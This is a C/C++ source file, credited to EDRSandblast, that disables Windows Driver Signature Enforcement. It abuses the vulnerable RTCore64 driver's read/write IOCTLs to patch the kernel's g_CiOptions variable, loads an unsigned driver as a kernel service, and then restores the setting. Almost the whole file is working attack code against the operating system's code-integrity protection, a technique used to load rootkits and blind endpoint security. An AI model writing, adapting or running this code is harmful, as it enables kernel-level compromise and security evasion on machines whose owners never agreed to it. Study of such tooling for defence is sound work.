/*
Credits to : https://github.com/wavestone-cdt/EDRSandblast
*/
#include <tchar.h>
#include <stdio.h>
#include <shlwapi.h>
#include <psapi.h>

#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "DbgHelp.lib")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#include "NtoskrnlOffsets.h"
#include "PdbSymbols.h"


union CiOffsets g_ciOffsets;


// Function to print Ntoskrnl offsets with attribute names
void PrintNtoskrnlOffsets() {
    printf("[+] Ntoskrnl offsets:\n");
    printf(" - g_CiOptions:\t\t\t 0x%llx\n", g_ciOffsets.st.g_CiOptions);
}


TCHAR g_ciPath[MAX_PATH] = { 0 };
LPTSTR GetCiPath() {
    if (_tcslen(g_ciPath) == 0) {
        // Retrieves the system folder (eg C:\Windows\System32).
        TCHAR systemDirectory[MAX_PATH] = { 0 };
        GetSystemDirectory(systemDirectory, _countof(systemDirectory));

        // Compute ci.dll path.
        _tcscat_s(g_ciPath, _countof(g_ciPath), systemDirectory);
        _tcscat_s(g_ciPath, _countof(g_ciPath), TEXT("\\ci.dll"));
    }
    return g_ciPath;
}



// Function to load ci.dll offsets from the Internet by fetching symbol information
// This function attempts to locate and extract specific kernel variables and function offsets
// related to code integrity mechanisms, particularly `g_CiOptions` and `CiValidateImageHeader`.
// The retrieved offsets are stored in the `g_ciOffsets` global structure.
BOOL LoadNtoskrnlOffsetsFromInternet(BOOL delete_pdb) {
    
    // Get the path of the `ci.dll` library, which is responsible for Windows Code Integrity checks.
    LPTSTR ciPath = GetCiPath();
    
    
    // Load the symbol table from the `ci.dll` binary file.
    symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(ciPath);
    if (sym_ctx == NULL) {
        return FALSE;
    }
    
    // Retrieve the offset of `g_CiOptions`, which controls Code Integrity behavior.
    g_ciOffsets.st.g_CiOptions = GetSymbolOffset(sym_ctx, "g_CiOptions");
    
    // Retrieve the offset of `CiValidateImageHeader`, a function used in integrity checks.
    g_ciOffsets.st.CiValidateImageHeader = GetSymbolOffset(sym_ctx, "CiValidateImageHeader");
    
    // Unload the symbols after retrieving the required offsets.
    // If `delete_pdb` is TRUE, it ensures that temporary symbol files are removed.
    UnloadSymbols(sym_ctx, delete_pdb);
    
    // Ensure that at least one of the offsets was successfully retrieved.
   // If both offsets are 0, it indicates failure.
   if (!g_ciOffsets.st.g_CiOptions && !g_ciOffsets.st.CiValidateImageHeader) {
        return FALSE;
   }
   // Return TRUE if at least one offset was successfully retrieved.
    return TRUE;
    
}


TCHAR g_ntoskrnlPath[MAX_PATH] = { 0 };
LPTSTR GetNtoskrnlPath() {
    if (_tcslen(g_ntoskrnlPath) == 0) {
        // Retrieves the system folder (eg C:\Windows\System32).
        GetSystemDirectory(g_ntoskrnlPath, _countof(g_ntoskrnlPath));

        // Compute ntoskrnl.exe path.
        PathAppend(g_ntoskrnlPath, TEXT("\\ntoskrnl.exe"));
    }
    return g_ntoskrnlPath;
}



void GetFileVersion(TCHAR* buffer, SIZE_T bufferLen, TCHAR* filename) {
    DWORD verHandle = 0;
    UINT size = 0;
    LPVOID lpBuffer = NULL;

    DWORD verSize = GetFileVersionInfoSize(filename, &verHandle);

    if (verSize != 0) {
        LPTSTR verData = (LPTSTR)calloc(verSize, 1);

        if (!verData) {
            printf("[!] Couldn't allocate memory to retrieve version data");
            return;
        }

        if (GetFileVersionInfo(filename, 0, verSize, verData)) {
            if (VerQueryValue(verData, TEXT("\\"), &lpBuffer, &size)) {
                if (size) {
                    VS_FIXEDFILEINFO* verInfo = (VS_FIXEDFILEINFO*)lpBuffer;
                    if (verInfo->dwSignature == 0xfeef04bd) {
                        DWORD majorVersion = (verInfo->dwFileVersionLS >> 16) & 0xffff;
                        DWORD minorVersion = (verInfo->dwFileVersionLS >> 0) & 0xffff;
                        _stprintf_s(buffer, bufferLen, TEXT("%ld-%ld"), majorVersion, minorVersion);
                        // _tprintf_or_not(TEXT("File Version: %d.%d\n"), majorVersion, minorVersion);
                    }
                }
            }
        }
        free(verData);
    }
}


TCHAR g_ntoskrnlVersion[256] = { 0 };
LPTSTR GetNtoskrnlVersion() {
    if (_tcslen(g_ntoskrnlVersion) == 0) {

        LPTSTR ntoskrnlPath = GetNtoskrnlPath();
        TCHAR versionBuffer[256] = { 0 };
        GetFileVersion(versionBuffer, _countof(versionBuffer), ntoskrnlPath);
        _stprintf_s(g_ntoskrnlVersion, 256, TEXT("ntoskrnl_%s.exe"), versionBuffer);
    }
    return g_ntoskrnlVersion;
}

// Finds the base address of a kernel module by name
DWORD64 FindKernelModuleAddressByName(_In_ LPTSTR name) {
    LPVOID drivers[1024] = { 0 };
    DWORD cbNeeded;
    DWORD cDrivers = 0;
    TCHAR szDriver[1024] = { 0 };

    // Get a list of loaded kernel modules
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        cDrivers = cbNeeded / sizeof(drivers[0]);
        for (DWORD i = 0; i < cDrivers; i++) {

            // Get module name and compare it with the target name
            if (drivers[i] && GetDeviceDriverBaseName(drivers[i], szDriver, _countof(szDriver))) {
                if (_tcsicmp(szDriver, name) == 0) {
                    return (DWORD64)drivers[i];
                }
            }
        }
    }
    printf("[!] Could not resolve %s kernel module's address\n", name);
    return 0;
}


// Retrieves the base address of CI.dll
DWORD64 FindCIBaseAddress() {
    DWORD64 CiBaseAddress = FindKernelModuleAddressByName((LPTSTR)TEXT("CI.dll"));
    return CiBaseAddress;
}





// Structure for reading memory via RTCore64
struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];      // Padding (unused)
    DWORD64 Address;   // Target memory address
    BYTE Pad1[8];      // Padding (unused)
    DWORD ReadSize;    // Number of bytes to read
    DWORD Value;       // Read value
    BYTE Pad3[16];     // Padding (unused)
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

// Structure for writing memory via RTCore64
struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];      // Padding (unused)
    DWORD64 Address;   // Target memory address
    BYTE Pad1[8];      // Padding (unused)
    DWORD ReadSize;    // Number of bytes to write
    DWORD Value;       // Value to write
    BYTE Pad3[16];     // Padding (unused)
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");


// IOCTL codes for memory read/write operations
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;



// Reads memory from a given address using the RTCore64 driver
DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}


// Writes a DWORD value to a given address using the RTCore64 driver
void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}

// Reads a BYTE (1 byte) from the target memory address
BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 1, Address) & 0xffffff;
}


// Reads a WORD (2 bytes) from the target memory address
WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

// Reads a DWORD (4 bytes) from the target memory address
DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

// Reads a DWORD64 (8 bytes) from the target memory address
DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}


// Writes a DWORD64 (8 bytes) to the target memory address
void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


// Opens a handle to the RTCore64 device driver
HANDLE GetDeviceHandle() {
    // Attempt to open the device with read/write access
    HANDLE Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
    if (Device == INVALID_HANDLE_VALUE) {
        printf("Unable to obtain a handle to the device object: %u\n", GetLastError());
        ExitProcess(0);
    }
    return Device; // Return the valid device handle

}


// Loads and starts a kernel-mode driver by creating a service entry
BOOL LoadAndStartDriver(const char* driverName)
{
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    BOOL bResult = FALSE;
    char driverFilePath[MAX_PATH];

    // Get the current directory
    DWORD dwRet = GetCurrentDirectoryA(MAX_PATH, driverFilePath);
    if (dwRet == 0 || dwRet > MAX_PATH) {
        printf("[-] Failed to get current directory. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Construct the full driver file path: "<current_directory>\<driverName>.sys"
    strncat(driverFilePath, "\\", MAX_PATH - strlen(driverFilePath) - 1);
    strncat(driverFilePath, driverName, MAX_PATH - strlen(driverFilePath) - 1);
    strncat(driverFilePath, ".sys", MAX_PATH - strlen(driverFilePath) - 1);

    printf("[*] Full driver path: %s\n", driverFilePath);

    // Open a handle to the Service Control Manager (SCM)
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        printf("[-] Failed to open Service Control Manager. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Create a new service for the driver
    hService = CreateServiceA(
        hSCManager,
        driverName,                    // Name of the service
        driverName,                    // Display name of the service
        SERVICE_START | DELETE | SERVICE_STOP,  // Desired access
        SERVICE_KERNEL_DRIVER,         // Service type (kernel-mode driver)
        SERVICE_DEMAND_START,          // Start type (demand start)
        SERVICE_ERROR_NORMAL,          // Error control type
        driverFilePath,                // Path to the driver file (e.g., <driverName>.sys)
        NULL,                          // No load ordering group
        NULL,                          // No tag identifier
        NULL,                          // No dependencies
        NULL,                          // Use the LocalSystem account
        NULL                           // No password
    );

    // Handle case where service already exists
    if (!hService) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            printf("[*] Service already exists, attempting to open it.\n");

            // If the service already exists, try to open it
            hService = OpenServiceA(hSCManager, driverName, SERVICE_START | DELETE | SERVICE_STOP);
            if (!hService) {
                printf("[-] Failed to open existing service. Error: %lu\n", GetLastError());
                CloseServiceHandle(hSCManager);
                return FALSE;
            }
        }
        else {
            printf("[-] Failed to create service. Error: %lu\n", GetLastError());
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }

    // Start the driver service
    if (!StartServiceA(hService, 0, NULL)) {
        if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[*] Driver is already running.\n");
        }
        else {
            printf("[-] Failed to start the service. Error: %lu\n", GetLastError());
            DeleteService(hService);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }
    else {
        printf("[+] Driver loaded and started successfully.\n");
    }

    // Cleanup: Close handles to the service and SCM
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return TRUE;
}




BOOL disableDSE() {
    // get the base address of CI.dll
    DWORD64 CiBaseAddress = FindCIBaseAddress();
    if (!CiBaseAddress) {
        printf("[-] CI base address not found !\n");
        return FALSE;
    }

    // get the base address of g_CiOptions
    DWORD64 g_CiOptionsAddress = CiBaseAddress + g_ciOffsets.st.g_CiOptions;
    
    printf("[+] CI Address : 0x%p\n", CiBaseAddress);
    printf("[+] g_CiOptions Address : 0x%p\n", g_CiOptionsAddress);

    // Opens a handle to the RTCore64 device driver
    HANDLE hDevice = GetDeviceHandle();

    // Read (value) 1 byte from g_CiOptions address
    DWORD g_CiOptionValue = ReadMemoryBYTE(hDevice, g_CiOptionsAddress);
   

    // Mask the lower 1 byte (8 bits) and print it as a hex value
    printf("[+] g_CiOptions Value = 0x%02X\n", g_CiOptionValue & 0xFF);

    printf("[+] Disable DSE\n");

    // disable DSE by changing g_CiOptions to 0xe (TestSigning mode)
    WriteMemoryPrimitive(hDevice, 1, g_CiOptionsAddress, 0xe);

    // re-Read (value) 1 byte from g_CiOptions address
    g_CiOptionValue = ReadMemoryBYTE(hDevice, g_CiOptionsAddress);
    

    printf("[*] Loading Unsigned Drivers\n");

    const char* driverName1 = "Hello";  // Driver service name

    // Load the unsigned Hello Driver
    if (LoadAndStartDriver(driverName1)) {
        printf("[+] Driver %s loaded successfully.\n", driverName1);
    }
    else {
        printf("[-] Failed to load driver %s.\n", driverName1);
    }



    // Mask the lower 1 byte (8 bits) and print it as a hex value
    printf("[+] g_CiOptions Value = 0x%02X\n", g_CiOptionValue & 0xFF);

    printf("[+] Re-Enable DSE\n");
    // re-enable DSE by changin g_Ciptions to 0x6 (DSE Enabled mode)
    WriteMemoryPrimitive(hDevice, 1, g_CiOptionsAddress, 0x6);

    // re-Read (value) 1 byte from g_CiOptions address
    g_CiOptionValue = ReadMemoryBYTE(hDevice, g_CiOptionsAddress);

    // Mask the lower 1 byte (8 bits) and print it as a hex value
    printf("[+] g_CiOptions Value = 0x%02X\n", g_CiOptionValue & 0xFF);

}